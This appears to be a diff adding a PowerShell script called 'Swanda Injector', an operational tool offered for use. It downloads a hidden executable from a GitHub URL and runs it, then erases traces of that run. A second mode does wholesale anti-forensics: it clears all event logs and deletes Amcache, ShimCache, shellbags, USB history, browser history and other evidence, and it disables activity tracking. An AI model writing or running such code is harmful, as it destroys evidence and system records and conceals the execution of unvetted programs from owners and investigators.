@@ -1,0 +1,382 @@
+<#
+.SYNOPSIS
+    Swanda Injector - Install / Clean
+.DESCRIPTION
+    Mode 1: Download and run program
+    Mode 2: Clean all traces
+.NOTES
+    Must Run as Administrator
+#>
+
+# ==================== Check Admin ====================
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Error "Please run as Administrator"
+    Read-Host "`nPress Enter to exit"
+    exit 1
+}
+
+# ==================== Variables ====================
+$URL = "https://raw.githubusercontent.com/Verte225066/test/main/fuckouangelV2.exe"
+$WORK_DIR = Join-Path $env:TEMP "SwandaInject"
+$EXE_NAME = "fuckouangelV2.exe"
+$EXE_PATH = Join-Path $WORK_DIR $EXE_NAME
+
+# ==================== Clean BAM/DAM ====================
+function Clear-BAMDAM {
+    $services = @("bam", "dam")
+    $patterns = @("*fuckouangel*", "*SwandaInject*", "*SwanadaInject*", "*ADMINI~1*")
+
+    foreach ($svc in $services) {
+        $basePath = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\State\UserSettings"
+        if (-not (Test-Path $basePath)) { continue }
+
+        $sidKeys = Get-ChildItem -Path $basePath -ErrorAction SilentlyContinue
+        foreach ($sidKey in $sidKeys) {
+            $props = Get-ItemProperty -Path $sidKey.PSPath -ErrorAction SilentlyContinue
+            $propNames = $props.PSObject.Properties | Where-Object { $_.Name -notin @('PSPath','PSParentPath','PSChildName','PSDrive','PSProvider') }
+
+            foreach ($prop in $propNames) {
+                $shouldDelete = $false
+                foreach ($pattern in $patterns) {
+                    if ($prop.Name -like $pattern) { $shouldDelete = $true; break }
+                }
+                if (-not $shouldDelete) {
+                    $value = $prop.Value
+                    if ($value -is [string]) {
+                        foreach ($pattern in $patterns) {
+                            if ($value -like $pattern) { $shouldDelete = $true; break }
+                        }
+                    } elseif ($value -is [byte[]]) {
+                        $str = [System.Text.Encoding]::Unicode.GetString($value) -replace "`0", ""
+                        foreach ($pattern in $patterns) {
+                            if ($str -like $pattern) { $shouldDelete = $true; break }
+                        }
+                    }
+                }
+                if ($shouldDelete) {
+                    Remove-ItemProperty -Path $sidKey.PSPath -Name $prop.Name -Force -ErrorAction SilentlyContinue
+                }
+            }
+
+            $remaining = Get-ItemProperty -Path $sidKey.PSPath -ErrorAction SilentlyContinue
+            $remainingProps = $remaining.PSObject.Properties | Where-Object { $_.Name -notin @('PSPath','PSParentPath','PSChildName','PSDrive','PSProvider') }
+            if ($remainingProps.Count -eq 0) {
+                Remove-Item -Path $sidKey.PSPath -Force -ErrorAction SilentlyContinue
+            }
+        }
+    }
+}
+
+# ==================== Clean Traces ====================
+function Clear-Traces {
+    Write-Host "Cleaning..." -ForegroundColor Yellow
+
+    # Prefetch
+    @(
+        "C:\Windows\Prefetch\*fuckouangel*.pf",
+        "C:\Windows\Prefetch\*SwandaInject*.pf"
+    ) | ForEach-Object { Remove-Item -Path $_ -Force -ErrorAction SilentlyContinue }
+
+    # BAM/DAM
+    Clear-BAMDAM
+
+    # Temp
+    @(
+        "$env:TEMP\*fuckouangel*",
+        "$env:TEMP\*SwandaInject*"
+    ) | ForEach-Object { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    if (Test-Path $WORK_DIR) { Remove-Item $WORK_DIR -Recurse -Force -ErrorAction SilentlyContinue }
+
+    # PowerShell History
+    Clear-History
+    $psHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    if (Test-Path $psHistory) {
+        $lines = Get-Content $psHistory -ErrorAction SilentlyContinue
+        $newLines = $lines | Where-Object { $_ -notlike "*fuckouangel*" -and $_ -notlike "*SwandaInject*" }
+        $newLines | Set-Content $psHistory -Force -ErrorAction SilentlyContinue
+    }
+}
+
+# ==================== Super Cleaner ====================
+function SuperCleaner {
+    Write-Host "Cleaning..." -ForegroundColor Yellow
+
+    # Stop services
+    @('DiagTrack', 'dmwappushservice', 'WSearch', 'SysMain', 'Bam', 'Dam') | ForEach-Object {
+        Stop-Service -Name $_ -Force -ErrorAction SilentlyContinue
+    }
+
+    # Anti-Forensics
+    @(
+        "$env:WINDIR\AppCompat\Programs\Amcache.hve",
+        "$env:WINDIR\AppCompat\Programs\RecentFileCache.bcf",
+        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache",
+        "HKLM:\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache",
+        "HKLM:\SYSTEM\ControlSet002\Control\Session Manager\AppCompatCache",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+
+    # Prefetch
+    Get-ChildItem -Path "$env:WINDIR\Prefetch" -Force -ErrorAction SilentlyContinue |
+        Where-Object { $_.Extension -ne '.ini' } |
+        Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+
+    # BAM/DAM
+    @(
+        "HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State",
+        "HKLM:\SYSTEM\CurrentControlSet\Services\Dam\State",
+        "HKLM:\SYSTEM\ControlSet001\Services\Bam\State",
+        "HKLM:\SYSTEM\ControlSet001\Services\Dam\State"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+
+    # Browser History
+    @('chrome', 'msedge', 'firefox', 'brave', 'opera', 'vivaldi', 'iexplore') | ForEach-Object {
+        Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue
+    }
+    Start-Sleep -Seconds 2
+
+    # Chrome, Edge, Brave, Opera, Vivaldi
+    $browserPaths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default",
+        "$env:LOCALAPPDATA\Opera Software\Opera Stable",
+        "$env:LOCALAPPDATA\Vivaldi\User Data\Default"
+    )
+    $files = @("History", "History-journal", "Shortcuts", "Top Sites", "Top Sites-journal", "Visited Links", "Web Data", "Web Data-journal")
+    foreach ($path in $browserPaths) {
+        if (Test-Path $path) {
+            foreach ($file in $files) {
+                Remove-Item -Path "$path\$file" -Force -ErrorAction SilentlyContinue
+            }
+        }
+    }
+
+    # Firefox
+    $firefoxProfiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
+    foreach ($profile in $firefoxProfiles) {
+        $p = $profile.FullName
+        @("places.sqlite", "favicons.sqlite", "formhistory.sqlite", "search.json.mozlz4") | ForEach-Object {
+            if (Test-Path "$p\$_") { Remove-Item -Path "$p\$_" -Force -ErrorAction SilentlyContinue }
+        }
+    }
+
+    # Internet Explorer
+    @(
+        "$env:LOCALAPPDATA\Microsoft\Windows\History",
+        "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs",
+        "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+
+    # Windows History
+    @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+
+    # Recent Documents
+    @(
+        [Environment]::GetFolderPath('Recent'),
+        "$env:APPDATA\Microsoft\Windows\Recent",
+        "$env:APPDATA\Microsoft\Office\Recent"
+    ) | ForEach-Object {
+        if (Test-Path $_) {
+            Get-ChildItem -Path $_ -Force -ErrorAction SilentlyContinue |
+                Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+        }
+    }
+
+    # Jump Lists
+    @(
+        "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
+        "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+
+    # Shellbags
+    @(
+        "HKCU:\Software\Microsoft\Windows\Shell\BagMRU",
+        "HKCU:\Software\Microsoft\Windows\Shell\Bags",
+        "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
+        "HKCU:\Software\Microsoft\Windows\ShellNoRoam\Bags",
+        "HKLM:\SOFTWARE\Microsoft\Windows\Shell\BagMRU",
+        "HKLM:\SOFTWARE\Microsoft\Windows\Shell\Bags"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+
+    # Clipboard
+    try {
+        Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
+        [System.Windows.Forms.Clipboard]::Clear()
+    } catch { $null | Set-Clipboard -ErrorAction SilentlyContinue }
+    @(
+        "$env:LOCALAPPDATA\Microsoft\Windows\Clipboard",
+        "$env:LOCALAPPDATA\Microsoft\Clipboard"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+
+    # Event Logs
+    try {
+        $logs = Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | Where-Object { $_.RecordCount -gt 0 }
+        foreach ($log in $logs) { wevtutil cl $log.LogName 2>$null }
+    } catch {}
+
+    # Timeline, Cortana, Search
+    @(
+        "$env:LOCALAPPDATA\ConnectedDevicesPlatform\*.ActivitiesCache.db",
+        "$env:LOCALAPPDATA\ConnectedDevicesPlatform\*.db",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Taskband",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\ActivityFeed",
+        "$env:LOCALAPPDATA\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentQuery",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\SearchBox"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+
+    # SRUM, USB, Mounted Volumes
+    @(
+        "HKLM:\SYSTEM\CurrentControlSet\Services\srum\State",
+        "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR",
+        "HKLM:\SYSTEM\CurrentControlSet\Enum\USB",
+        "HKLM:\SYSTEM\MountedDevices"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+
+    # Recycle Bin
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+    # Thumbnail Cache
+    @(
+        "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db",
+        "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\iconcache_*.db"
+    ) | ForEach-Object {
+        Get-ChildItem -Path $_ -ErrorAction SilentlyContinue |
+            Remove-Item -Force -ErrorAction SilentlyContinue
+    }
+
+    # Temp Files
+    @("$env:TEMP", "$env:TMP", "$env:WINDIR\Temp") | ForEach-Object {
+        if (Test-Path $_) {
+            Get-ChildItem -Path $_ -Force -ErrorAction SilentlyContinue |
+                Where-Object { $_.Name -notlike "*.log" -and $_.Name -notlike "*.tmp" } |
+                Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+        }
+    }
+
+    # Network Traces
+    ipconfig /flushdns 2>$null
+    try { netsh interface ip delete arpcache 2>$null } catch {}
+
+    # PowerShell History
+    $psHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    if (Test-Path $psHistory) { Remove-Item -Path $psHistory -Force -ErrorAction SilentlyContinue }
+    Clear-History
+
+    # CMD + Run History
+    @(
+        "HKCU:\Software\Microsoft\Command Processor\History",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+
+    # Registry Cleanup
+    @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\Wordpad\Recent File List",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\Paint\Recent File List",
+        "HKCU:\Software\Microsoft\Notepad\RecentFileList",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\*.OpenWithList",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\AddressBarMRU",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\SearchBoxMRU",
+        "HKCU:\Software\Microsoft\Internet Explorer\Recovery"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+
+    # Prevent history creation
+    $clipPolicy = "HKCU:\Software\Microsoft\Clipboard\History"
+    if (-not (Test-Path $clipPolicy)) { New-Item -Path $clipPolicy -Force | Out-Null }
+    Set-ItemProperty -Path $clipPolicy -Name "EnableHistory" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+
+    $timelinePolicy = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"
+    if (-not (Test-Path $timelinePolicy)) { New-Item -Path $timelinePolicy -Force | Out-Null }
+    Set-ItemProperty -Path $timelinePolicy -Name "EnableActivityFeed" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $timelinePolicy -Name "EnableBAM" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $timelinePolicy -Name "EnableDAM" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+
+    # Restart services
+    @('DiagTrack', 'dmwappushservice', 'WSearch', 'SysMain') | ForEach-Object {
+        Start-Service -Name $_ -ErrorAction SilentlyContinue
+    }
+
+    Write-Host "Done" -ForegroundColor Green
+}
+
+# ==================== Install Mode ====================
+function Install-Mode {
+    Write-Host "Downloading..." -ForegroundColor Cyan
+    if (-not (Test-Path $WORK_DIR)) {
+        New-Item -ItemType Directory -Path $WORK_DIR -Force | Out-Null
+    }
+
+    try {
+        Invoke-WebRequest -Uri $URL -OutFile $EXE_PATH -ErrorAction Stop
+    } catch {
+        Write-Host "Download failed: $_" -ForegroundColor Red
+        return
+    }
+
+    Set-ItemProperty -Path $EXE_PATH -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -Force
+
+    Write-Host "Running..." -ForegroundColor Cyan
+    $proc = Start-Process -FilePath $EXE_PATH -PassThru -Wait
+
+    Clear-Traces
+    Write-Host "Done" -ForegroundColor Green
+}
+
+# ==================== Main Menu ====================
+while ($true) {
+    Clear-Host
+    Write-Host "========================" -ForegroundColor Cyan
+    Write-Host "  Swanda Injector" -ForegroundColor White
+    Write-Host "========================" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host "  1. Install"
+    Write-Host "  2. Clean"
+    Write-Host "  3. Exit"
+    Write-Host ""
+    $choice = Read-Host "Select [1-3]"
+
+    switch ($choice) {
+        "1" { Install-Mode }
+        "2" { SuperCleaner }
+        "3" { Write-Host "Exit..."; break }
+        default { Write-Host "Invalid choice" -ForegroundColor Red }
+    }
+
+    if ($choice -ne "3") {
+        Write-Host ""
+        Start-Sleep -Seconds 1
+    }
+}
